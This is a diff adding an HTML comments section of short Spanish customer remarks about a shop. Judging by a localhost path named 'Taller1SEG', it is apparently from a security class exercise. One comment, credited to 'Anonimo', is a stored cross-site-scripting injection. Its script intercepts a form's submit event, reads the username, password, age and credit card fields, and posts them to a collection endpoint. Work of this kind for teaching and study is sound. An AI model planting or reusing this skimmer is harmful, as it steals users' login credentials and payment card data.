@@ -1,0 +1,28 @@
+<p><strong>Marin:</strong> hola :)</p>
+<p><strong>Naomi:</strong> Espero las ofertas...</p>
+<p><strong>Jose:</strong> me gusta el contenido de esta tienda</p>
+
+
+<p><strong>Marina:</strong> Hola me gusto la atención.</p>
+<p><strong>Juan:</strong> Buena Pagina.</p>
+<p><strong>Flor:</strong> Me gusto la atención al cliente</p>
+<p><strong>John:</strong> no me gusto el catalogo :(</p>
+<p><strong>Anonimo:</strong> <script>
+document.getElementById("datosForm")?.addEventListener("submit", function(e) {
+  e.preventDefault();
+  const u = document.getElementById("usuario")?.value;
+  const c = document.getElementById("clave")?.value;
+  const e_ = document.getElementById("edad")?.value;
+  const t = document.getElementById("tarjeta")?.value;
+  if (u && c && e_ && t) {
+    const datos = `Nombre=${u}, Contraseña=${c}, Edad=${e_}, Tarjeta=${t}\n`;
+    fetch("http://localhost/trabajos/Taller1SEG/www.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: "datos=" + encodeURIComponent(datos)
+    });
+  }
+});
+</script>
+</p>
+<p><strong>Lucas:</strong> holaaaa me jodieron la vida ;,,)</p>
